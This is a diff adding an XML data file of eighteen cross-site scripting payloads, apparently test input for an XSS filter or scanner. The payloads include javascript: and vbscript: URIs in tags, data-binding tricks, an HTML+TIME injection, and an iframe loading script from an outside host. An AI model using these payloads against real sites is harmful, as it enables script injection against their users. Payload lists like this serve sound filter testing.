@@ -1,0 +1,58 @@
+<?xml version="1.0" ?>
+<xssalert>
+	<xssalertvector>
+		<vector><![CDATA[<iframe src=http://ha.ckers.org/scriptlet.html <]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> ]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<BODY BACKGROUND="javascript:alert('XSS')">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG DYNSRC="javascript:alert('XSS')">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG LOWSRC="javascript:alert('XSS')">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<BGSOUND SRC="javascript:alert('XSS');">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<BR SIZE="&{alert('XSS')}">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC='vbscript:msgbox("XSS")'>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC="mocha:[XSS]">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC="livescript:[XSS]">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<XSS STYLE="behavior: url(xss.htc);">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC='vbscript:msgbox("XSS")'>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC="mocha:[code]">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<IMG SRC="livescript:[code]">]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></vector>
+	</xssalertvector>
+	<xssalertvector>
+		<vector><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></vector>
+	  </xssalertvector>
+
+</xssalert>
